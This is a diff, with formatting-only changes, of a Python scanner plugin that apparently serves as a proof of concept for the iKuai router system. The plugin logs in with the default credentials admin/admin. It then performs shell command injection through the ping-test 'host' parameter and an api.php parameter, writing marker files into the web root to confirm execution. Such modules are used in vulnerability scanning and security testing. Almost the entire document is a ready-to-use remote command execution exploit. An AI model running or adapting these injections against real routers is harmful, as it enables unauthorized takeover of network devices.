@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'iKuai_0006' # 平台漏洞编号，留空
+    vuln_id = 'iKuai_0006'  # 平台漏洞编号，留空
     name = 'iKuai(爱快系统) 弱口令，远程命令执行'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.RCE # 漏洞类型
+    type = VulnType.RCE  # 漏洞类型
     disclosure_date = 'Unknown'  # 漏洞公布时间
     desc = '''
         iKuai(爱快系统)存在弱口令漏洞，以及远程代码执行漏洞。
@@ -17,6 +18,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'iKuai(爱快系统)'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '580c2177-2194-4054-ad5f-78de42940986'
@@ -30,7 +32,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             hh = hackhttp.hackhttp()
             post = 'user=admin&pass=admin'
             url = self.target + '/login/x'
@@ -43,7 +45,8 @@ class Poc(ABPoc):
 
                 upload_url = self.target + '/Tools/ping_test/start'
                 upload_post = "host=www.baidu.com' | echo test_vul >/tmp/ikuai/www/resources/js/vul.js |/usr/ikuai/script/Ping start host='www.baidu.com&src=&count=10"
-                code, head, res, errcode, _ = hh.http(upload_url, post=upload_post)
+                code, head, res, errcode, _ = hh.http(
+                    upload_url, post=upload_post)
                 if code == 200 and '[info]shell:' in res:
                     shell_url = self.target + '/resources/js/vul.js'
                     code, head, res, errcode, _ = hh.http(shell_url)
@@ -51,10 +54,11 @@ class Poc(ABPoc):
                         #security_hole('Commend Exec'+upload_url)
                         self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                             target=self.target, name=self.vuln.name))
-                
+
                 upload2_url = self.target + '/api.php'
                 upload2_post = "type=home&get_lans_top10_param[type]=123;echo test_vul+>+/tmp/ikuai/www/resources/js/vultwo.js"
-                code, head, res, errcode, _ = hh.http(upload2_url, post=upload2_post)
+                code, head, res, errcode, _ = hh.http(
+                    upload2_url, post=upload2_post)
                 if code == 200 and 'protocal' in res:
                     shell2_url = self.target + '/resources/js/vultwo.js'
                     code, head, res, errcode, _ = hh.http(shell2_url)
@@ -68,6 +72,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
